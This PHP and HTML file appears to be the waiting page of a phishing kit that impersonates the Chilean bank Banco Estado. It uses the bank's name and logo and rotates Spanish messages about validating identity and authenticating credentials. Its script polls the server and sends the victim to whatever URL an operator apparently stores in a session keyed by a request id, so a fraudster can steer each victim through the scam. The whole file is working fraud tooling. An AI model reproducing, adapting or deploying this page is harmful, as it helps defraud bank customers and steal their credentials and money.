<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

if (!isset($_GET['id']) || !preg_match('/^[a-zA-Z0-9,-]{5,}$/', $_GET['id'])) {
    http_response_code(400);
    exit;
}

$request_id = $_GET['id'];

session_write_close();
session_id($request_id);
session_start();

if (!isset($_SESSION['load_entry_time'])) {
    $_SESSION['load_entry_time'] = time();
}

if (isset($_GET['check'])) {
    header('Content-Type: application/json; charset=UTF-8');
    if (isset($_SESSION['redirect']) && isset($_SESSION['redirect_set_time'])) {
        if ($_SESSION['redirect_set_time'] > $_SESSION['load_entry_time']) {
            echo json_encode(['redirect' => $_SESSION['redirect']]);
            unset($_SESSION['redirect'], $_SESSION['redirect_set_time']);
        } else {
            echo json_encode(['redirect' => null]);
        }
    } else {
        echo json_encode(['redirect' => null]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e8eef5 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        /* Fondo con patrón sutil */
        body::before {
            content: '';
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(2, 87, 160, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(220, 53, 69, 0.05) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06), 0 4px 16px rgba(0, 0, 0, 0.08);
            padding: 50px 40px;
            text-align: center;
            animation: slideUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            z-index: 1;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 35px;
            animation: fadeIn 0.8s ease-out 0.2s both;
        }

        .logo-img {
            width: 130px;
            height: 130px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: white;
            border-radius: 12px;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
        }

        .logo-text {
            display: none;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            color: #0257a0;
            margin-bottom: 12px;
            line-height: 1.3;
            min-height: 40px;
            animation: fadeIn 0.8s ease-out 0.35s both;
        }

        .subtitle {
            font-size: 13px;
            color: #6b7280;
            margin-bottom: 38px;
            font-weight: 500;
            animation: fadeIn 0.8s ease-out 0.5s both;
        }

        /* Contador circular - OCULTO */
        .counter-container {
            display: none;
        }

        /* Sección de carga */
        .loading-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 22px;
        }

        /* Spinner mejorado - estilo Banco Estado */
        .spinner {
            position: relative;
            width: 56px;
            height: 56px;
        }

        .spinner-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 3px solid rgba(2, 87, 160, 0.15);
            border-radius: 50%;
            animation: spin 2s linear infinite;
        }

        .spinner-ring:nth-child(1) {
            border-top: 3px solid #0257a0;
            animation-duration: 1.8s;
        }

        .spinner-ring:nth-child(2) {
            border-right: 3px solid #dc3545;
            animation: spin 1.2s linear infinite reverse;
            animation-delay: 0.3s;
            width: 75%;
            height: 75%;
            top: 12.5%;
            left: 12.5%;
        }

        .spinner-ring:nth-child(3) {
            border-bottom: 3px solid #ff8c00;
            animation-duration: 0.9s;
            width: 50%;
            height: 50%;
            top: 25%;
            left: 25%;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 15px;
            color: #1f2937;
            font-weight: 600;
            letter-spacing: 0.2px;
        }

        .status-message {
            font-size: 12px;
            color: #9ca3af;
            animation: pulse 2s ease-in-out infinite;
            font-weight: 500;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        /* Indicadores de progreso */
        .progress-indicators {
            display: flex;
            gap: 6px;
            justify-content: center;
            margin-top: 15px;
        }

        .progress-dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: #e5e7eb;
            animation: progressPulse 1.6s ease-in-out infinite;
        }

        .progress-dot:nth-child(1) { animation-delay: 0s; }
        .progress-dot:nth-child(2) { animation-delay: 0.3s; }
        .progress-dot:nth-child(3) { animation-delay: 0.6s; }

        @keyframes progressPulse {
            0%, 60% { 
                background: #e5e7eb;
                transform: scale(1);
            }
            30% { 
                background: #0257a0;
                transform: scale(1.15);
            }
            100% { 
                background: #e5e7eb;
                transform: scale(1);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(8px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeInOut {
            0% { 
                opacity: 0; 
                transform: translateY(-8px); 
            }
            50% { 
                opacity: 1; 
                transform: translateY(0); 
            }
            100% { 
                opacity: 0; 
                transform: translateY(8px); 
            }
        }

        /* Responsive */
        @media (max-width: 480px) {
            .container {
                padding: 40px 25px;
                border-radius: 14px;
                max-width: 95vw;
            }

            .logo-img {
                width: 80px;
                height: 80px;
            }

            .logo-text {
                font-size: 14px;
                margin-left: 10px;
            }

            .title {
                font-size: 24px;
                min-height: 36px;
            }

            .subtitle {
                font-size: 12px;
                margin-bottom: 32px;
            }



            .loading-section {
                gap: 18px;
            }

            .spinner {
                width: 50px;
                height: 50px;
            }

            .loading-text {
                font-size: 14px;
            }

            .status-message {
                font-size: 11px;
            }
        }

        @media (max-width: 360px) {
            .container {
                padding: 30px 20px;
                border-radius: 12px;
            }

            .title {
                font-size: 22px;
                margin-bottom: 10px;
            }

            .logo-img {
                width: 75px;
                height: 75px;
            }

            .logo-text {
                font-size: 13px;
            }


        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header con Logo -->
        <div class="header">
            <div class="logo-img">
                <img src="logo-banco-estado.svg" alt="Logo Banco Estado">
            </div>
            <div class="logo-text">BancoEstado</div>
        </div>

        <!-- Título dinámico -->
        <h1 class="title" id="dynamicTitle">Validando Identidad</h1>
        <p class="subtitle">Por favor espera mientras procesamos tu solicitud</p>



        <!-- Sección de Carga -->
        <div class="loading-section">
            <!-- Spinner estilo Banco Estado -->
            <div class="spinner">
                <div class="spinner-ring"></div>
                <div class="spinner-ring"></div>
                <div class="spinner-ring"></div>
            </div>

            <div class="loading-text" id="statusText">Procesando solicitud</div>
            <div class="status-message" id="statusSubtext">Autenticando credenciales</div>

            <!-- Indicadores de progreso -->
            <div class="progress-indicators">
                <div class="progress-dot"></div>
                <div class="progress-dot"></div>
                <div class="progress-dot"></div>
            </div>
        </div>
    </div>

    <script>
        // Array de mensajes dinámicos
        const mensajes = [
            'Validando Identidad',
            'Verificando Datos',
            'Procesando Solicitud',
            'Autenticando Usuario',
            'Validando Información'
        ];

        const subtitulos = [
            'Autenticando credenciales',
            'Verificando información',
            'Procesando solicitud',
            'Finalizando validación',
            'Cargando datos'
        ];

        let indiceActual = 0;

        // Cambiar título dinámicamente
        function cambiarTitulo() {
            const titulo = document.getElementById('dynamicTitle');
            const subtitulo = document.getElementById('statusSubtext');
            
            titulo.style.animation = 'none';
            
            setTimeout(() => {
                titulo.textContent = mensajes[indiceActual];
                subtitulo.textContent = subtitulos[indiceActual];
                titulo.style.animation = 'fadeInOut 0.6s ease-in-out';
                indiceActual = (indiceActual + 1) % mensajes.length;
            }, 50);
        }

        // Cambiar título cada 5 segundos
        setInterval(cambiarTitulo, 5000);

        // Redireccionamiento backend
        function checkRedirect() {
            fetch('load.php?id=<?php echo htmlspecialchars($request_id ?? "", ENT_QUOTES, "UTF-8"); ?>&check=1')
                .then(res => res.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.redirect;
                    } else {
                        setTimeout(checkRedirect, 1500);
                    }
                })
                .catch(() => setTimeout(checkRedirect, 1500));
        }

        window.onload = checkRedirect;
    </script>
</body>
</html>
